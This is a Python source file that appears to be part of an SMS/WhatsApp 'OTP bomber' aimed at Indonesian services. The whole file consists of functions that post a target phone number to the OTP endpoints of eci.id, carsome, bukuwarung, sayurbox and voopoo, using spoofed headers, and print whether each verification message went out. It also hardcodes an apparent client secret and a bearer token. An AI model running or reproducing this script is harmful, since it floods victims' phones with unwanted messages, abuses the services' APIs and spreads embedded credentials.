from novia import setup as s

def eci(no):
	hd = {'Host': 'eci.id','Accept': 'application/json, text/plain, */*','Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','Referer': f'https://eci.id/verification?step=1&phone=0{no}','Origin': 'https://eci.id','user-agent':''+s.ua}
	dt = s.jd({"identity":f"0{no}","with":"whatsapp"})
	main = s.rp('https://eci.id/api/signup', headers=hd, data=dt)
	if "success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Whatsapp Otp Succesfully Sending To {s.h}{no}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Whatsapp Otp Failed Sending To {s.a}{no}');

#if "success" in main.text:
#print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{n}');
#else:
#print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{n}');

def carsome(no):
	hd = {'Host':'www.carsome.id','user-agent':''+s.ua, 'content-Accept':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'A4p3vs1Ixu9wp3wFmCEG9K','sec-ch-ua-platform':'Android','origin':'https://www.carsome.id','referer':'https://www.carsome.id/'}
	dt = s.jd({"username":f"{no}","optType":1})
	main = s.rp('https://www.carsome.id/website/login/sendSMS', headers=hd, data=dt)
	if "Send successfully" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Whatsapp Otp Succesfully Sending To {s.h}{no}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Whatsapp Otp Failed Sending To {s.a}{no}');

def bukwa(no):
	hd = {"Host":"api-v2.bukuwarung.com","user-agent":""+s.ua,"content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","origin":"https://tokoko.id","referer":"https://tokoko.id/"}
	dt = s.jd({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":f"{no}","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})
	main = s.rp('https://api-v2.bukuwarung.com/api/v2/auth/otp/send', headers=hd, data=dt)
	if "WA OTP dikirim" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Whatsapp Otp Succesfully Sending To {s.h}{no}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Whatsapp Otp Failed Sending To {s.a}{no}');

def sayur(no):
	hd = {"Host":"www.sayurbox.com","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":""+s.ua,"origin":"https://www.sayurbox.com"}
	dt = s.jd({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":f"+62{no}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})
	main = s.rp('https://www.sayurbox.com/graphql/v1?deduplicate=1', headers=hd, data=dt)
	if "success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Whatsapp Otp Succesfully Sending To {s.h}{no}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Whatsapp Otp Failed Sending To {s.a}{no}');

def vp(no):
	hd = {'Host': 'club-id.voopoo.com','accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with': 'XMLHttpRequest','user-agent': ''+s.ua,'origin': 'https://club-id.voopoo.com','referer': 'https://club-id.voopoo.com/register.php?lang=idn&referralid=857'}
	dt = f'mobile=0062{no}&lang=idn&country_code=0062&source=H5'
	main = s.rp('https://club-id.voopoo.com/api/mobile/index.php?version=5&referralid=857&module=sendsms', headers=hd, data=dt)
	if "1000" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{no}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{no}');

